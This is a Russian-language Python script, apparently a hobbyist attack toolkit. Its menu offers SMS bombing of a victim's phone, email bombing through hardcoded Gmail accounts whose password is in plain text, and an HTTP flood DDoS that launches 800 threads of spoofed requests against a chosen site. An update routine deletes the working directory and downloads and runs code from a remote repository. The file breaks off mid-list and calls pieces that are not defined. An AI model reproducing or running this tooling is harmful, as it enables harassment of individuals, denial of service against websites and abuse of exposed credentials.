def setting():
  global url
  global url2
  global urlport
  os.system('cls' if os.name=='nt' else 'clear')
  print (logo)
  print ("Введите адрес сайта:")
  url = input(">>>").strip()
  if url == "":
    os.system('cls' if os.name=='nt' else 'clear')
    print (logo)
    print ("[!] Неправильный адрес")
    setting()
  try:
    if url[0]+url[1]+url[2]+url[3] == "www.":
      url = "http://" + url
    elif url[0]+url[1]+url[2]+url[3] == "http":
      pass
    else:
      url = "http://" + url
  except:                                                                                              
    os.system('cls' if os.name=='nt' else 'clear')
    print (logo)
    print ("[!] Неправильный адрес")
    setting()
  try:                                
    url2 = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
  except:
    url2 = url.replace("http://", "").replace("https://", "").split("/")[0]                                                                               
  try:               
    urlport = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[1]
  except:
    urlport = "80"                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
  global multiple
  os.system('cls' if os.name=='nt' else 'clear')
  print (logo)
  print ("Вставьте число умножения для атаки:")
  print ("[*] БОЛЬШЕ 1000 ТОЛЬКО ДЛЯ МОЩНЫХ ПК С ХОРОШИМ ИНТЕРНЕТОМ!")
  multiple = int(input(">>>"))
  ddos()

def sms():
  os.system('cls' if os.name=='nt' else 'clear')
  print (logo)
  print ('Введите номер жертвы: (7XXXXXXXXX)')
  phone = input ('>>>')
  if len(phone) == 11 or len(phone) == 12 or len(phone) == 13:
    pass
  else:
    print ("[!] Неправильный номер.")
    time.sleep(2)
    sms()
  phone9 = phone[1:]
  phoneAresBank = "+"+ phone[0]+"("+ phone[1:4]+")"+ phone[4:7]+"-"+ phone[7:9]+"-"+ phone[9:11]
  phone9dostavista =  phone9[:3]+"+"+ phone9[3:6]+"-"+ phone9[6:8]+"-"+ phone9[8:10]
  phoneOstin = "+"+ phone[0]+"+("+ phone[1:4]+")"+ phone[4:7]+"-"+ phone[7:9]+"-"+ phone[9:11]
  phonePizzahut = "+" + phone[0]+" ("+ phone[1:4]+") "+ phone[4:7]+" "+ phone[7:9]+" "+ phone[9:11]
  phoneGorzdrav =  phone[1:4]+") "+ phone[4:7]+"-"+ phone[7:9]+"-"+ phone[9:11]
  namechoose2 = ['Йувер', 'Цукенберг', 'Умерведённый', 'Екажорсеч', 'Нобиль', 'Гопарь', 'Шумерга']
  name = random.choice (namechoose2)
  while True:
    requests.post('http://localhost:1459/attack/start', json={"number_of_cycles":"1000", "phone":phone}, headers={"Accept-Language":"ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7", "Connection":"keep-alive", "Host":"localhost:1459", "Origin":"http://localhost:1459", "Referer":"http://localhost:1459/"})
    time.sleep(1200)
    os.system('cls' if os.name=='nt' else 'clear')
    print (logo)
    print ('[*] Спамер завершён')
    print ('[1] - ВЫХОД В ГЛАВНОЕ МЕНЮ')
    print ('[2] - ВЕРНУТСЯ В СПАМ СМС')
    choose3 = input ('>>>')
    if choose3 == '1':
      main()
    if choose3 == '2':
      sms()
    else:
      os.system('cls' if os.name=='nt' else 'clear')
      print (logo)
      print ('[*] Вы автоматически перенаправлены в главное меню')
      time.sleep(2)
      main()

def mail():
  global Login
  global P
  Login = [
  "spammerarnold1@gmail.com", 
  "spammerarnold2@gmail.com",
  "spammerarnold3@gmail.com",
  "spammerarnold4@gmail.com",
  "spammerarnold5@gmail.com",
  "spammerarnold6@gmail.com"
  #"spammerarnold7@mail.ru",
  #"spammerarnold8@mail.ru",
  #"spammerarnold9@mail.ru",
  #"spammerarnold10@mail.ru",
  #"spammerarnold11@mail.ru",
  #"spammerarnold12@mail.ru",
  #"spammerarnold13@mail.ru",
  #"spammerarnold14@mail.ru",
  #"spammerarnold15@mail.ru",
  #"spammerarnold16@mail.ru",
  #"spammerarnold17@mail.ru",
  #"spammerarnold18@mail.ru",
  #"spammerarnold19@mail.ru",
  #"spammerarnold20@mail.ru",
  #"spammerarnold21@mail.ru",
  #"spammerarnold22@mail.ru",
  #"spammerarnold23@mail.ru",
  #"spammerarnold24@mail.ru",
  #"spammerarnold25@mail.ru",
  #"spammerarnold26@mail.ru",
  #"spammerarnold27@mail.ru",
  #"spammerarnold28@mail.ru",
  #"spammerarnold29@mail.ru",
  #"spammerarnold30@mail.ru"
  ]
  P = "454647Ws"
  mail3()
def mail3():
  global To
  os.system('cls' if os.name=='nt' else 'clear')
  print (logo)
  print ('Почта жертвы')
  To = input ('>>>')
  if To == "":
    os.system('cls' if os.name=='nt' else 'clear')
    print (logo)
    print ('[!] Ошибка! Повтори запрос!')
    time.sleep(2)
    mail3()
  else:
    mail6()
def mail6():
  global N
  os.system('cls' if os.name=='nt' else 'clear')
  print (logo)
  print ('Количество писем')
  N = input ('>>>')
  if N == "":
    os.system('cls' if os.name=='nt' else 'clear')
    print (logo)
    print ('[!] Ошибка! Повтори запрос!')
    time.sleep(2)
    mail6()
  else:
    for value in range( int( N ) ):
      global L
      M = ""
      T = ""
      timemail1 = 0
      while random.choice(timemail) >= timemail1:
        M = M + random.choice(chars)
        T = T + random.choice(chars)
        timemail1 = timemail1 + 1
      L = random.choice(Login)
      print (L[20:24])
      if L[20:24] == ".com":
        U = "smtp.gmail.com"
      if L[20:24] == ".ru" or L[20:24] == ".rus"or L[20:24] == "ru":
        U = "smtp.mail.ru"
      msg = MIMEMultipart()
      msg[ 'Subject' ] = T
      msg[ 'From' ] = L 
      body = M
      msg.attach( MIMEText( body, 'plain' ) )
      server = root.SMTP_SSL( U, 465 )
      server.login( L, P )
      server.sendmail( L, To, msg.as_string() )
      server.quit()
      value += 1
    os.system('cls' if os.name=='nt' else 'clear')
    print (logo)
    print ('[*] Спамер завершён')
    print ('[1] - ВЫХОД В ГЛАВНОЕ МЕНЮ')
    print ('[2] - ВЕРНУТСЯ В СПАМ ПОЧТЫ')
    choose3 = input ('>>>')
    if choose3 == '1':
      main()
    if choose3 == '2':
      mail()
    else:
      os.system('cls' if os.name=='nt' else 'clear')
      print (logo)
      print ('[*] Вы автоматически перенаправлены в главное меню')
      time.sleep(2)
      main()

def ddos():
  global threads
  global get_host
  global acceptall
  global connection
  global go
  global x
  threads = 800
  get_host = "GET " + url + " HTTP/1.1\r\nHost: " + url2 + "\r\n"
  acceptall = [
  "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n", 
  "Accept-Encoding: gzip, deflate\r\n", 
  "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
  "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
  "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
  "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
  "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
  "Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
  "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
  "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
  "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
  "Accept: text/html, application/xhtml+xml",
  "Accept-Language: en-US,en;q=0.5\r\n",
  "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
  "Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",]
  connection = "Connection: Keep-Alive\r\n"
  go = threading.Event()
  for x in range(threads):
    RequestDefaultHTTP(x+1).start()
    print ("[*] Пакет отправлен!")
  go.set()

def main():
  os.system('cls' if os.name=='nt' else 'clear')
  print (Fore.GREEN + logo)
  try:
      requests.get("http://google.com", verify=True)
  except:
      os.system('cls' if os.name=='nt' else 'clear')
      conection()
  print ("[*] ПРОИСХОДИТ ЗАПУСК ПРОГРАММЫ!")
  time.sleep(1)
  os.system('cls' if os.name=='nt' else 'clear')
  print (logo)
  print ('[1] - ОТКРЫТЬ СПАМЕР')
  print ('[2] - ОБНОВИТЬ СПАМЕР')
  choose = input ('>>>')
  if choose == '1':
    openspam()
  if choose == '2':
    openupdate()
  else:
    os.system('cls' if os.name=='nt' else 'clear')
    print (logo)
    print ('[!] Ошибка! Повтори запрос!')
    time.sleep(2)
    main()
      
def openspam():
  os.system('cls' if os.name=='nt' else 'clear')
  print (logo)
  print ('[1] - ТОЛЬКО СПАМ СМС')
  print ('[2] - ТОЛЬКО СПАМ ПОЧТЫ')
  print ('[3] - DDOS САЙТА')
  print ('[4] - ВЫХОД')
  choose2 = input ('>>>')
  if choose2 == '1':
    sms()
  if choose2 == '2':
    mail()
  if choose2 == '3':
    setting()
  if choose2 == '4':
    main()
  else:
    os.system('cls' if os.name=='nt' else 'clear')
    print (logo)
    print ('[!] Ошибка! Повтори запрос!')
    time.sleep(2)
    openspam()
     
def openupdate():
  if os.name == 'nt':
    os.system('cls' if os.name=='nt' else 'clear')
    print (logo)
    print ('[*] Происходит установка...')
    directory = os.getcwd()
    username = os.environ.get("USERNAME")
    os.system("DEL /q /s" + directory)
    urllib.request.urlretrieve('https://github.com/Arstas/spammer/archive/master.zip', 'C:/Users/' + username + '/Documents/spammer-master.zip')
    archive = 'C:/Users/' + username + '/Documents/spammer-master.zip'
    unziparchive = zipfile.ZipFile(archive)
    unziparchive.extractall('C:/Users/' + username + '/Documents')
    unziparchive.close()
    os.system("XCOPY \\Users\\" + username + "\\Documents\\spammer-master " + directory +" /E /Y")
    os.system('RMDIR /q /s ' + 'C:\\Users\\' + username + '\\Documents\\spammer-master')
    os.system('DEL /q /s ' + 'C:\\Users\\' + username + '\\Documents\\spammer-master.zip')
  else:
    os.system('cls' if os.name=='nt' else 'clear')
    print (logo)
    print ('[*] Происходит установка...')
    os.system("cd")
    os.system("rm -rf spammer")
    os.system("git clone https://github.com/Arstas/spammer")
    os.system("cd spammer")
    os.system("python3 install.py")
def conection():
  os.system('cls' if os.name=='nt' else 'clear')
  print (logo)
  print ('[!] Нет интернет соединения')
  print ('[1] - ПРОВЕРИТЬ ПОДКЛЮЧЕНИЕ')
  connect = input ('>>>')
  if connect == '1':
    main()
  else:
    os.system('cls' if os.name=='nt' else 'clear')
    print (logo)
    print ('[!] Ошибка! Повтори запрос!')
    time.sleep(2)
    connection()
import requests, random, time, json, colorama, os, threading, socks, socket, urllib.request, zipfile
import smtplib as root
from colorama import Fore, Back
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
colorama.init()
logo = '''
╔═══╦═══╗     ╔╗  ╔═══╗
║╔═╗║╔═╗║     ║║  ╚╗╔╗║
║║ ║║╚═╝╠═╗╔══╣║   ║║║║
║╚═╝║╔╗╔╣╔╗╣╔╗║║ ╔╗║║║║
║╔═╗║║║╚╣║║║╚╝║╚═╝╠╝╚╝║
╚╝ ╚╩╝╚═╩╝╚╩══╩═══╩═══╝'''
timemail = [3,
            4,
            5,
            6,
            7,
            8,
            9,
            10,
            11,
            12,
            13,
            14,
            15,
            16,
            17,
            18,
            19,
            20]
chars =[str(random.random()) + str(random.random()) + "Привет сегодня вышло обновление системы безопасности window",
        str(random.random()) + str(random.random()) + "И будет все не так, как здесь решим мы",
        str(random.random()) + str(random.random()) + "На портале публикуется 821 019 авторов, сейчас из них 847 в сети",
        str(random.random()) + str(random.random()) + "А я вам открыл столько стихов шкатулок",
        str(random.random()) + str(random.random()) + "В плену сентябрьской тоски",
        str(random.random()) + str(random.random()) + "Обожаю лето",
        str(random.random()) + str(random.random()) + "А идеалы миру лишь затем",
        str(random.random()) + str(random.random()) + "Наполнит ветер ночь интриг",
        str(random.random()) + str(random.random()) + "Жюр22",
        str(random.random()) + str(random.random()) + "Шалят на улицах столицы",
        str(random.random()) + str(random.random()) + "Полосато платье",
        str(random.random()) + str(random.random()) + "Сообщество Поэзия Русского Мира",
        str(random.random()) + str(random.random()) + "В плену сентябрьской тоски",
        str(random.random()) + str(random.random()) + "Для них – беззубый фельетон",
        str(random.random()) + str(random.random()) + "Белые мухи",
        str(random.random()) + str(random.random()) + "27 ноября - День оценщика",
        str(random.random()) + str(random.random()) + "Свои даруют образы и звуки",
        str(random.random()) + str(random.random()) + "Татьяна Кадникова",
        str(random.random()) + str(random.random()) + "Все вы на бабочку поэтиного сердца",
        str(random.random()) + str(random.random()) + "Запорошил нахальный пух",
        str(random.random()) + str(random.random()) + "Бездонной выси голубой",
        str(random.random()) + str(random.random()) + "Липкие занятия",
        str(random.random()) + str(random.random()) + "Докрашиваю памяти лубок",
        str(random.random()) + str(random.random()) + "Я старше Пушкина",
        str(random.random()) + str(random.random()) + "Утонет мир в котле июня",
        str(random.random()) + str(random.random()) + "Мир под рулады соловья",
        str(random.random()) + str(random.random()) + "Ощетинит ножки стоглавая вошь",
        str(random.random()) + str(random.random()) + "Лариса Белоус",
        str(random.random()) + str(random.random()) + "И отдаляются, как проклятые люди",
        str(random.random()) + str(random.random()) + "Рекомендуемые авторы",
        str(random.random()) + str(random.random()) + "Как восковая эпиляция интимной зоны, я патетически поэтичен",
        str(random.random()) + str(random.random()) + "Екатерина Вавилова-Комарова",
        str(random.random()) + str(random.random()) + "Мария Знобищева",
        str(random.random()) + str(random.random()) + "В итоге здесь не будет ничего",
        str(random.random()) + str(random.random()) + "Владимир Мялин",
        str(random.random()) + str(random.random()) + "Лишь только сбросят в бездну лета",
        str(random.random()) + str(random.random()) + "Толпа озвереет, будет тереться",
        str(random.random()) + str(random.random()) + "Да и я не паломник",
        str(random.random()) + str(random.random()) + "В итоге здесь не будет ничего",
        str(random.random()) + str(random.random()) + "Ровесникам экспромт",
        str(random.random()) + str(random.random()) + "Игнатова Анна",
        str(random.random()) + str(random.random()) + "Добавить ваше имя",
        str(random.random()) + str(random.random()) + "Восславят музыку ручья",
        str(random.random()) + str(random.random()) + "Таня Зачёсова",
        str(random.random()) + str(random.random()) + "И ты не жди, раз дома нету",
        str(random.random()) + str(random.random()) + "Звездный в небе невод",
        str(random.random()) + str(random.random()) + "Как жизнь и смерть на кончике ножа",
        str(random.random()) + str(random.random()) + "У нее еще вчера",
        str(random.random()) + str(random.random()) + "Художник",
        str(random.random()) + str(random.random()) + "И в знойном мареве слепящем",
        str(random.random()) + str(random.random()) + "Глаза чарующего мая",
        str(random.random()) + str(random.random()) + "А я в киношном стиле Джеймса Бонда",
        str(random.random()) + str(random.random()) + "Сергей Харьковский",
        str(random.random()) + str(random.random()) + "Абель Алексей",
        str(random.random()) + str(random.random()) + "Наталья Бэрн",
        str(random.random()) + str(random.random()) + "И ты не жди, раз дома нету",
        str(random.random()) + str(random.random()) + "Двустволка",
        str(random.random()) + str(random.random()) + "Дмитрий Почемучка1",
        str(random.random()) + str(random.random()) + "Татьяна Кадникова",
        str(random.random()) + str(random.random()) + "Моя высокопарная прогулка",
        str(random.random()) + str(random.random()) + "Всем, кто дерзок в любви",
        str(random.random()) + str(random.random()) + "И море станет солоней",
        str(random.random()) + str(random.random()) + "Абель Алексей",
        str(random.random()) + str(random.random()) + "Апрельский дождь прошел впервые",
        str(random.random()) + str(random.random()) + "Илья Раманов",
        str(random.random()) + str(random.random()) + "А ты найдешь добычу с ней",
        str(random.random()) + str(random.random()) + "На голых веточках берез",
        str(random.random()) + str(random.random()) + "Взойдут у неба на груди",
        str(random.random()) + str(random.random()) + "Валуев",
        str(random.random()) + str(random.random()) + "Маврин",
        str(random.random()) + str(random.random()) + "Глаголев",
        str(random.random()) + str(random.random()) + "Шанявский",
        str(random.random()) + str(random.random()) + "Писарев",
        str(random.random()) + str(random.random()) + "Недобров",
        str(random.random()) + str(random.random()) + "Байков",
        str(random.random()) + str(random.random()) + "Вагин",
        str(random.random()) + str(random.random()) + "Карачинский",
        str(random.random()) + str(random.random()) + "Ягодинский",
        str(random.random()) + str(random.random()) + "Хованский",
        str(random.random()) + str(random.random()) + "Горюшкин",
        str(random.random()) + str(random.random()) + "Щегловитов Никита",
        str(random.random()) + str(random.random()) + "Золотаревский Павел",
        str(random.random()) + str(random.random()) + "Костин Архипп",
        str(random.random()) + str(random.random()) + "Власьев Альберт",
        str(random.random()) + str(random.random()) + "Бошняк Клавдий",
        str(random.random()) + str(random.random()) + "Биркин Хавст",
        str(random.random()) + str(random.random()) + "Свирский Иммануил",
        str(random.random()) + str(random.random()) + "Лизунов Апеллий",
        str(random.random()) + str(random.random()) + "Готовцев Назарий",
        str(random.random()) + str(random.random()) + "Балабан Руфин",
        str(random.random()) + str(random.random()) + "Митрофанов Аетий",
        str(random.random()) + str(random.random()) + "Картамышев Феофилакт",
        str(random.random()) + str(random.random()) + "Зайцев Акиндин Данилович",
        str(random.random()) + str(random.random()) + "Довголевский Иларий Марленович",
        str(random.random()) + str(random.random()) + "Лисицын Евграф Доминикович",
        str(random.random()) + str(random.random()) + "Радилов Валент Аверкиевич",
        str(random.random()) + str(random.random()) + "Кугушев Харисий Калистратович",
        str(random.random()) + str(random.random()) + "Бражников Максим Парменович",
        str(random.random()) + str(random.random()) + "Никольский Лаврентий Кузьмич",
        str(random.random()) + str(random.random()) + "Асеев Гермоген Ильич",
        str(random.random()) + str(random.random()) + "Еропкин Гонорат Самойлович",
        str(random.random()) + str(random.random()) + "Гарденин Руф Павлович",
        str(random.random()) + str(random.random()) + "Бузовлев Варлаам Мирославович",
        str(random.random()) + str(random.random()) + "Бухвостов Фефил Пименович",
        str(random.random()) + str(random.random()) + "Ангелин",
        str(random.random()) + str(random.random()) + "Эдуард",
        str(random.random()) + str(random.random()) + "Адриан",
        str(random.random()) + str(random.random()) + "Смарагд",
        str(random.random()) + str(random.random()) + "Август",
        str(random.random()) + str(random.random()) + "Акентий",
        str(random.random()) + str(random.random()) + "Владлен",
        str(random.random()) + str(random.random()) + "Полуект",
        str(random.random()) + str(random.random()) + "Петроний",
        str(random.random()) + str(random.random()) + "Аарон",
        str(random.random()) + str(random.random()) + "Виталиан",
        str(random.random()) + str(random.random()) + "Иоиль",
        str(random.random()) + str(random.random()) + "Светозарович",
        str(random.random()) + str(random.random()) + "Савельевич",
        str(random.random()) + str(random.random()) + "Рафаилович",
        str(random.random()) + str(random.random()) + "Лонгинович",
        str(random.random()) + str(random.random()) + "Арнольдович",
        str(random.random()) + str(random.random()) + "Феофилактович",
        str(random.random()) + str(random.random()) + "Алексиевич",
        str(random.random()) + str(random.random()) + "Дионисиевич",
        str(random.random()) + str(random.random()) + "Валерьянович",
        str(random.random()) + str(random.random()) + "Кимович",
        str(random.random()) + str(random.random()) + "Гаврилович",
        str(random.random()) + str(random.random()) + "Юрьевич",
        str(random.random()) + str(random.random()) + "Evlashev Borislav Anastasevich",
        str(random.random()) + str(random.random()) + "Tatishhev Askold Nikanorovich",
        str(random.random()) + str(random.random()) + "Bachurin Ahramey Ionich",
        str(random.random()) + str(random.random()) + "Smirnov Evfimiy Samsonovich",
        str(random.random()) + str(random.random()) + "Finkelshteyn Demid Zinovevich",
        str(random.random()) + str(random.random()) + "Bakurinskiy Filimon Efimovich",
        str(random.random()) + str(random.random()) + "Uvarov Kapiton Ardalionovich",
        str(random.random()) + str(random.random()) + "Vlezkov Bogdan Merkulovich",
        str(random.random()) + str(random.random()) + "Bogdanovich Filaret Mstislavovich",
        str(random.random()) + str(random.random()) + "Voshhinin Kasyan Lavrentievich",
        str(random.random()) + str(random.random()) + "Bereznikov Izot Avramievich",
        str(random.random()) + str(random.random()) + "Yanovskiy Polikarp Evgrafovich",
        str(random.random()) + str(random.random()) + "Myatlev Feliks",
        str(random.random()) + str(random.random()) + "Golub Rafail",
        str(random.random()) + str(random.random()) + "Rumyanczev Evlogiy",
        str(random.random()) + str(random.random()) + "Pozdeev Poluekt",
        str(random.random()) + str(random.random()) + "Olovennikov Avdey",
        str(random.random()) + str(random.random()) + "Kargolomskiy Leonid",
        str(random.random()) + str(random.random()) + "Shishkin Severin",
        str(random.random()) + str(random.random()) + "Shiray Gavriil",
        str(random.random()) + str(random.random()) + "Veber Pavsikakiy",
        str(random.random()) + str(random.random()) + "Novikov Askold",
        str(random.random()) + str(random.random()) + "Davidovich Mihey",
        str(random.random()) + str(random.random()) + "Krukoveczkiy Feofil",
        str(random.random()) + str(random.random()) + "Ryumin",
        str(random.random()) + str(random.random()) + "Stahanov",
        str(random.random()) + str(random.random()) + "Pronskiy",
        str(random.random()) + str(random.random()) + "Kasagov",
        str(random.random()) + str(random.random()) + "Adlerberg",
        str(random.random()) + str(random.random()) + "Savelov",
        str(random.random()) + str(random.random()) + "Doroshenko",
        str(random.random()) + str(random.random()) + "Berger",
        str(random.random()) + str(random.random()) + "Grekov",
        str(random.random()) + str(random.random()) + "Butenev",
        str(random.random()) + str(random.random()) + "Hodyrevskiy",
        str(random.random()) + str(random.random()) + "Kremer",
        str(random.random()) + str(random.random()) + "Mokievich",
        str(random.random()) + str(random.random()) + "Anfimovich",
        str(random.random()) + str(random.random()) + "Arturovich",
        str(random.random()) + str(random.random()) + "Merkurievich",
        str(random.random()) + str(random.random()) + "Karpovich",
        str(random.random()) + str(random.random()) + "Teodorovich",
        str(random.random()) + str(random.random()) + "Bazhenovich",
        str(random.random()) + str(random.random()) + "Azarevich",
        str(random.random()) + str(random.random()) + "Sevastianovich",
        str(random.random()) + str(random.random()) + "Askoldovich",
        str(random.random()) + str(random.random()) + "Fadeevich",
        str(random.random()) + str(random.random()) + "Porfirevich",
        str(random.random()) + str(random.random()) + "Concealed chapter listening",
        str(random.random()) + str(random.random()) + "Subjects acuteness taste",
        str(random.random()) + str(random.random()) + "Towards songs does real folly",
        str(random.random()) + str(random.random()) + "Which roof dull pure hand living edward",
        str(random.random()) + str(random.random()) + "Good coming",
        str(random.random()) + str(random.random()) + "Indulgence him exposed walls",
        str(random.random()) + str(random.random()) + "Small explained frankness",
        str(random.random()) + str(random.random()) + "Agreed luckily request county delay",
        str(random.random()) + str(random.random()) + "Diminution saved account",
        str(random.random()) + str(random.random()) + "Objection old least form demesne",
        str(random.random()) + str(random.random()) + "Noisier pulled green",
        str(random.random()) + str(random.random()) + "Vexed misery declared",
        str(random.random()) + str(random.random()) + "Barton greatly",
        str(random.random()) + str(random.random()) + "Service wishing",
        str(random.random()) + str(random.random()) + "Should among",
        str(random.random()) + str(random.random()) + "Are gate friends eldest beloved",
        str(random.random()) + str(random.random()) + "Landlord projecting",
        str(random.random()) + str(random.random()) + "Ten about drift their",
        str(random.random()) + str(random.random()) + "Delatatico",
        str(random.random()) + str(random.random()) + "Rinarercha",
        str(random.random()) + str(random.random()) + "Rtordamald",
        str(random.random()) + str(random.random()) + "Huledubeca",
        str(random.random()) + str(random.random()) + "Yemeienelh",
        str(random.random()) + str(random.random()) + "Phatoshaco",
        str(random.random()) + str(random.random()) + "Kenlenamer",
        str(random.random()) + str(random.random()) + "Prabibitam",
        str(random.random()) + str(random.random()) + "Gidenadian",
        str(random.random()) + str(random.random()) + "Perickaleb",
        str(random.random()) + str(random.random()) + "Eonityanna",
        str(random.random()) + str(random.random()) + "Petheodors",
        str(random.random()) + str(random.random()) + "Aitlynetta",
        str(random.random()) + str(random.random()) + "Carrelaina",
        str(random.random()) + str(random.random()) + "Sheenevian",
        str(random.random()) + str(random.random()) + "Onahinahin",
        str(random.random()) + str(random.random()) + "Kanonathad",
        str(random.random()) + str(random.random()) + "BenTBPXOXt",
        str(random.random()) + str(random.random()) + "FXlNJDTeKw",
        str(random.random()) + str(random.random()) + "qgi3XYZjZw",
        str(random.random()) + str(random.random()) + "pjo5Y9GbZS",
        str(random.random()) + str(random.random()) + "An8w1n4XKK",
        str(random.random()) + str(random.random()) + "uEvGdwyjk9",
        str(random.random()) + str(random.random()) + "LOkyKCdiOU",
        str(random.random()) + str(random.random()) + "tsPoajR2MA",
        str(random.random()) + str(random.random()) + "GNOaVnMxHy",
        str(random.random()) + str(random.random()) + "iOqGiluryF",]
userag=["Mozilla/5.0(Windows;U;WindowsNT6.1;sv-SE)AppleWebKit/533.19.4(KHTML,likeGecko)Version/5.0.3Safari/533.19.4","Mozilla/5.0(Linux;Android7.0;SM-G930VCBuild/NRD90M;wv)AppleWebKit/537.36(KHTML,likeGecko)Version/4.0Chrome/58.0.3029.83MobileSafari/537.36","Mozilla/5.0(Linux;Android7.0;SM-G892ABuild/NRD90M;wv)AppleWebKit/537.36(KHTML,likeGecko)Version/4.0Chrome/60.0.3112.107MobileSafari/537.36","Mozilla/5.0(Linux;Android7.1.1;G8231Build/41.2.A.0.219;wv)AppleWebKit/537.36(KHTML,likeGecko)Version/4.0Chrome/59.0.3071.125MobileSafari/537.36"]
acpt=["Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language:en-US,en;q=0.5\r\nAccept-Encoding:gzip,deflate\r\n","Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language:en-US,en;q=0.5\r\n","Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding:br;q=1.0,gzip;q=0.8,*;q=0.1\r\n",]
useragent=["Mozilla/5.0(Macintosh;IntelMacOSX10_9_3)AppleWebKit/537.75.14(KHTML,likeGecko)Version/7.0.3Safari/7046A194A","Mozilla/5.0(iPad;CPUOS6_0likeMacOSX)AppleWebKit/536.26(KHTML,likeGecko)Version/6.0Mobile/10A5355dSafari/8536.25","Mozilla/5.0(Macintosh;IntelMacOSX10_6_8)AppleWebKit/537.13+(KHTML,likeGecko)Version/5.1.7Safari/534.57.2","Mozilla/5.0(Macintosh;IntelMacOSX10_7_3)AppleWebKit/534.55.3(KHTML,likeGecko)Version/5.1.3Safari/534.53.10","Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/70.0.3538.77Safari/537.36","Mozilla/5.0(WindowsNT6.2;WOW64)AppleWebKit/537.36(KHTMLlikeGecko)Chrome/44.0.2403.155Safari/537.36","Mozilla/5.0(WindowsNT6.1)AppleWebKit/537.36(KHTML,likeGecko)Chrome/41.0.2228.0Safari/537.36","Mozilla/5.0(X11;Linuxi686;rv:64.0)Gecko/20100101Firefox/64.0","Mozilla/5.0(WindowsNT6.1;WOW64;rv:64.0)Gecko/20100101Firefox/64.0","Mozilla/5.0(X11;Linuxi586;rv:63.0)Gecko/20100101Firefox/63.0","Mozilla/5.0(WindowsNT6.2;WOW64;rv:63.0)Gecko/20100101Firefox/63.0","Mozilla/5.0(Macintosh;U;IntelMacOSX;en-US;rv:1.8.1.13)Gecko/20080313Firefox","Mozilla/5.0(Macintosh;U;PPCMacOSXMach-O;rv:1.8.1.16)Gecko/20080702Firefox","Mozilla/5.0(Windows;U;WindowsNT5.1;de-DE;rv:1.9.2.20)Gecko/20110803Firefox","Mozilla/5.0(Windows;U;WindowsNT5.1;en-GB;rv:1.9.0.6)Gecko/2009011913Firefox","Mozilla/5.0(X11;;Linuxx86_64;rv:1.8.1.6)Gecko/20070802Firefox","Mozilla/5.0(X11;U;GentooLinuxx86_64;pl-PL)GeckoFirefox"]#CodeByGogoZin
acceptall=[
"Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language:en-US,en;q=0.5\r\nAccept-Encoding:gzip,deflate\r\n",
"Accept-Encoding:gzip,deflate\r\n",
"Accept-Language:en-US,en;q=0.5\r\nAccept-Encoding:gzip,deflate\r\n",
"Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language:en-US,en;q=0.5\r\nAccept-Charset:iso-8859-1\r\nAccept-Encoding:gzip\r\n",
"Accept:application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset:iso-8859-1\r\n",
"Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding:br;q=1.0,gzip;q=0.8,*;q=0.1\r\nAccept-Language:utf-8,iso-8859-1;q=0.5,*;q=0.1\r\nAccept-Charset:utf-8,iso-8859-1;q=0.5\r\n",
"Accept:image/jpeg,application/x-ms-application,image/gif,application/xaml+xml,image/pjpeg,application/x-ms-xbap,application/x-shockwave-flash,application/msword,*/*\r\nAccept-Language:en-US,en;q=0.5\r\n",
"Accept:text/html,application/xhtml+xml,image/jxr,*/*\r\nAccept-Encoding:gzip\r\nAccept-Charset:utf-8,iso-8859-1;q=0.5\r\nAccept-Language:utf-8,iso-8859-1;q=0.5,*;q=0.1\r\n",
